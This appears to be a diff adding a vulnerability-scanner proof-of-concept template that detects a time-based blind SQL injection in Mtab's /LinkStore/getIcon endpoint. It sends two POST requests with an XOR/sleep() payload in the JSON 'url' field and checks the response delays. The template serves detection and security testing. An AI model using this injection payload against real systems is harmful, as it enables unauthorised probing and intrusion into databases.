@@ -1,0 +1,34 @@
+name: poc-yaml-Mtab-LinkStore_getIcon-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /LinkStore/getIcon
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+      body: |
+        {"url":"'XOR(if(now()=sysdate(),sleep(6),0))XOR'"}
+    expression: response.latency >= 6000 && response.latency <= 7000
+  r1:
+    request:
+      method: POST
+      path: /LinkStore/getIcon
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Content-Type: application/json
+      body: |
+        {"url":"'XOR(if(now()=sysdate(),sleep(10),0))XOR'"}
+    expression: response.latency >= 10000 && response.latency <= 11000
+
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486258&idx=1&sn=d6f5aedad1bcc39c4cd0879e08d58898&chksm=c267be01f5103717b3cec252ed579ab7923a35f3eb2ab50afa5987cc3670c6871ff9050f92b7&token=1742030890&lang=zh_CN#rd
+
+
